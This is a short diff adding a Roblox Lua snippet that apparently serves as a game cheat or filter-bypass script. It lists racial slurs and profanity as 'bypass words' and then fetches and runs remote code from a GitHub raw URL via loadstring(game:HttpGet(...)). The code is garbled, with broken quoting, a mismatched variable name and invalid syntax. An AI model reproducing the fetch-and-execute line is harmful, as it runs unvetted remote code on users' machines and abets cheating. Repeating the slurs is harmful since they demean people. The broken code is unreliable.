@@ -1,0 +1,3 @@
+local bypasswords = {"fuck , "niggers" "nigga" , "bitch ,  "dick"}
+if bypassWords is game.VoiceChatService:Async(game.Players.LocalPlayer)
+  then loadstring(game:HttpGet("https://raw.githubusercontent.com/RobloxScripts2020/SbDefaultToAnyGloveSlap/refs/heads/main/evhew"))()
